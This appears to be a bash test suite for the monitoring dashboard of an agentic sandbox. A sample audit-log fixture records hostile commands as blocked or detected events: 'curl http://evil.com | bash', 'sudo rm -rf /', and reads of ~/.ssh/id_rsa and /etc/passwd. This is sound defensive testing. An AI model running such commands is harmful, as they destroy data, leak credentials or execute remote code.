#!/bin/bash
# test-tui.sh - Tests for sentry-tui.sh
# Validates: script loads, --once mode renders, data collection functions work,
# health scoring, violation parsing, edge cases (empty logs, missing files).

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"

source "$SCRIPT_DIR/lib/test-helpers.sh"
source "$PROJECT_DIR/sentry-config.sh" 2>/dev/null || true

# --- Setup isolated test environment ---
test_isolate

# Helper: run TUI in --once mode with isolated env, strip ANSI codes
_run_tui_once() {
    local extra_env="${1:-}"
    bash -c "
        export SENTRY_HOME='$SENTRY_HOME'
        export SENTRY_LOG_DIR='$SENTRY_HOME/logs'
        export AUDIT_LOG='${AUDIT_LOG}'
        export SENTRY_MODE='soft-block'
        $extra_env
        bash '$PROJECT_DIR/sentry-tui.sh' --once 2>&1
    " | sed 's/\x1b\[[0-9;]*[a-zA-Z]//g'
}

# Helper: run TUI with a custom audit log path
_run_tui_with_log() {
    local log_path="$1"
    bash -c "
        export SENTRY_HOME='$SENTRY_HOME'
        export SENTRY_LOG_DIR='$SENTRY_HOME/logs'
        export AUDIT_LOG='$log_path'
        export SENTRY_MODE='soft-block'
        bash '$PROJECT_DIR/sentry-tui.sh' --once 2>&1
    " | sed 's/\x1b\[[0-9;]*[a-zA-Z]//g'
}

test_suite_begin "TUI: Script basics"

run_test "sentry-tui.sh exists" test -f "$PROJECT_DIR/sentry-tui.sh"
run_test "sentry-tui.sh is executable" test -x "$PROJECT_DIR/sentry-tui.sh"

test_suite_begin "TUI: --once mode (snapshot)"

assert_contains "once mode shows header" "AGENTIC SANDBOX SENTRY" _run_tui_once
assert_contains "once mode shows component health section" "COMPONENT HEALTH" _run_tui_once
assert_contains "once mode shows violation summary section" "VIOLATION SUMMARY" _run_tui_once
assert_contains "once mode shows recent violations section" "RECENT VIOLATIONS" _run_tui_once
assert_contains "once mode shows footer controls" "[q]" _run_tui_once
assert_contains "once mode shows mode" "soft-block" _run_tui_once
assert_contains "once mode shows health bar" "Health:" _run_tui_once

test_suite_begin "TUI: Data collection — empty state"

assert_contains "shows total events zero with no log" "Total events:" _run_tui_once
assert_contains "shows no violations message" "no violations" _run_tui_once

# Test with nonexistent audit log
_nonexistent_log_output() {
    bash -c "
        export SENTRY_HOME='$SENTRY_HOME'
        export SENTRY_LOG_DIR='$SENTRY_HOME/logs'
        export AUDIT_LOG='/tmp/nonexistent-audit-$$.log'
        export SENTRY_MODE='soft-block'
        bash '$PROJECT_DIR/sentry-tui.sh' --once 2>&1
    " | sed 's/\x1b\[[0-9;]*[a-zA-Z]//g'
}
assert_contains "handles missing audit log gracefully" "AGENTIC SANDBOX SENTRY" _nonexistent_log_output

test_suite_begin "TUI: Data collection — with sample data"

# Create a sample audit log with known content
SAMPLE_LOG="$SENTRY_HOME/logs/test-audit.log"
mkdir -p "$(dirname "$SAMPLE_LOG")"
cat > "$SAMPLE_LOG" << 'LOGS'
{"ts":"2026-05-30T14:00:01+00:00","host":"test","pid":100,"ppid":99,"user":"testuser","component":"hooks","decision":"SOFT_BLOCKED","severity":"critical","reason":"rm -rf outside allowed dirs","cmd":"rm -rf /tmp/important","cwd":"/home/testuser","mode":"soft-block","shell":"zsh"}
{"ts":"2026-05-30T14:00:02+00:00","host":"test","pid":101,"ppid":99,"user":"testuser","component":"hooks","decision":"DETECTED","severity":"warning","reason":"access to ~/.ssh/id_rsa","cmd":"cat ~/.ssh/id_rsa","cwd":"/home/testuser","mode":"soft-block","shell":"zsh"}
{"ts":"2026-05-30T14:00:03+00:00","host":"test","pid":102,"ppid":99,"user":"testuser","component":"hooks","decision":"HARD_ENFORCEMENT","severity":"critical","reason":"sudo rm -rf /","cmd":"sudo rm -rf /","cwd":"/","mode":"hard","shell":"zsh"}
{"ts":"2026-05-30T14:00:04+00:00","host":"test","pid":103,"ppid":99,"user":"testuser","component":"hooks","decision":"DETECTED","severity":"warning","reason":"curl pipe to bash","cmd":"curl http://evil.com | bash","cwd":"/tmp","mode":"soft-block","shell":"zsh"}
{"ts":"2026-05-30T14:00:05+00:00","host":"test","pid":104,"ppid":99,"user":"testuser","component":"hooks","decision":"SOFT_BLOCKED","severity":"critical","reason":"sensitive path access","cmd":"cat /etc/passwd","cwd":"/","mode":"soft-block","shell":"zsh"}
LOGS

run_test "sample data shows blocked label" bash -c "
    export SENTRY_HOME='$SENTRY_HOME'
    export SENTRY_LOG_DIR='$SENTRY_HOME/logs'
    export AUDIT_LOG='$SAMPLE_LOG'
    export SENTRY_MODE='soft-block'
    bash '$PROJECT_DIR/sentry-tui.sh' --once 2>&1 | sed 's/\x1b\[[0-9;]*[a-zA-Z]//g' | grep -q 'Blocked:'
"

run_test "sample data shows hard enforce label" bash -c "
    export SENTRY_HOME='$SENTRY_HOME'
    export SENTRY_LOG_DIR='$SENTRY_HOME/logs'
    export AUDIT_LOG='$SAMPLE_LOG'
    export SENTRY_MODE='soft-block'
    bash '$PROJECT_DIR/sentry-tui.sh' --once 2>&1 | sed 's/\x1b\[[0-9;]*[a-zA-Z]//g' | grep -q 'Hard enforce:'
"

run_test "sample data shows SOFT_BLOCKED" bash -c "
    export SENTRY_HOME='$SENTRY_HOME'
    export SENTRY_LOG_DIR='$SENTRY_HOME/logs'
    export AUDIT_LOG='$SAMPLE_LOG'
    export SENTRY_MODE='soft-block'
    bash '$PROJECT_DIR/sentry-tui.sh' --once 2>&1 | grep -q 'SOFT_BLOCKED'
"

run_test "sample data shows HARD_ENFORCEMENT" bash -c "
    export SENTRY_HOME='$SENTRY_HOME'
    export SENTRY_LOG_DIR='$SENTRY_HOME/logs'
    export AUDIT_LOG='$SAMPLE_LOG'
    export SENTRY_MODE='soft-block'
    bash '$PROJECT_DIR/sentry-tui.sh' --once 2>&1 | grep -q 'HARD_ENFORCEMENT'
"

run_test "sample data shows violation reason" bash -c "
    export SENTRY_HOME='$SENTRY_HOME'
    export SENTRY_LOG_DIR='$SENTRY_HOME/logs'
    export AUDIT_LOG='$SAMPLE_LOG'
    export SENTRY_MODE='soft-block'
    bash '$PROJECT_DIR/sentry-tui.sh' --once 2>&1 | grep -q 'rm -rf'
"

run_test "sample data shows total 5" bash -c "
    export SENTRY_HOME='$SENTRY_HOME'
    export SENTRY_LOG_DIR='$SENTRY_HOME/logs'
    export AUDIT_LOG='$SAMPLE_LOG'
    export SENTRY_MODE='soft-block'
    bash '$PROJECT_DIR/sentry-tui.sh' --once 2>&1 | grep -q 'Total events'
"

test_suite_begin "TUI: Edge cases"

# Long violation reason
LONG_LOG="$SENTRY_HOME/logs/long-test.log"
mkdir -p "$(dirname "$LONG_LOG")"
LONG_REASON=$(printf 'x%.0s' $(seq 1 200))
echo "{\"ts\":\"2026-05-30T14:00:01+00:00\",\"host\":\"test\",\"pid\":100,\"ppid\":99,\"user\":\"u\",\"component\":\"hooks\",\"decision\":\"SOFT_BLOCKED\",\"severity\":\"critical\",\"reason\":\"$LONG_REASON\",\"cmd\":\"test\",\"cwd\":\"/tmp\",\"mode\":\"soft-block\"}" > "$LONG_LOG"

run_test "handles very long violation reasons" bash -c "
    export SENTRY_HOME='$SENTRY_HOME'
    export SENTRY_LOG_DIR='$SENTRY_HOME/logs'
    export AUDIT_LOG='$LONG_LOG'
    export SENTRY_MODE='soft-block'
    bash '$PROJECT_DIR/sentry-tui.sh' --once 2>&1 | grep -q 'AGENTIC SANDBOX SENTRY'
"

# Malformed JSON in log
BAD_LOG="$SENTRY_HOME/logs/bad-test.log"
mkdir -p "$(dirname "$BAD_LOG")"
echo 'this is not json' > "$BAD_LOG"
echo '{"ts":"2026-05-30T14:00:01+00:00","decision":"DETECTED","reason":"ok"}' >> "$BAD_LOG"

run_test "handles malformed JSON in log" bash -c "
    export SENTRY_HOME='$SENTRY_HOME'
    export SENTRY_LOG_DIR='$SENTRY_HOME/logs'
    export AUDIT_LOG='$BAD_LOG'
    export SENTRY_MODE='soft-block'
    bash '$PROJECT_DIR/sentry-tui.sh' --once 2>&1 | grep -q 'AGENTIC SANDBOX SENTRY'
"

# Empty audit log
EMPTY_LOG="$SENTRY_HOME/logs/empty-test.log"
mkdir -p "$(dirname "$EMPTY_LOG")"
touch "$EMPTY_LOG"

run_test "handles empty audit log" bash -c "
    export SENTRY_HOME='$SENTRY_HOME'
    export SENTRY_LOG_DIR='$SENTRY_HOME/logs'
    export AUDIT_LOG='$EMPTY_LOG'
    export SENTRY_MODE='soft-block'
    output=\$(bash '$PROJECT_DIR/sentry-tui.sh' --once 2>&1 | sed 's/\x1b\[[0-9;]*[a-zA-Z]//g')
    echo \"\$output\" | grep -q 'no violations'
"

test_suite_begin "TUI: sentryctl integration"

run_test "sentryctl help mentions tui" bash -c "
    output=\$(bash '$PROJECT_DIR/sentryctl' help 2>&1)
    echo \"\$output\" | grep -q 'tui'
"

run_test "sentryctl tui --once works" bash -c "
    export SENTRY_HOME='$SENTRY_HOME'
    export SENTRY_LOG_DIR='$SENTRY_HOME/logs'
    export AUDIT_LOG='$EMPTY_LOG'
    output=\$(bash '$PROJECT_DIR/sentryctl' tui --once 2>&1 | sed 's/\x1b\[[0-9;]*[a-zA-Z]//g')
    echo \"\$output\" | grep -q 'AGENTIC SANDBOX SENTRY'
"

# --- Cleanup and report ---
test_cleanup
test_report
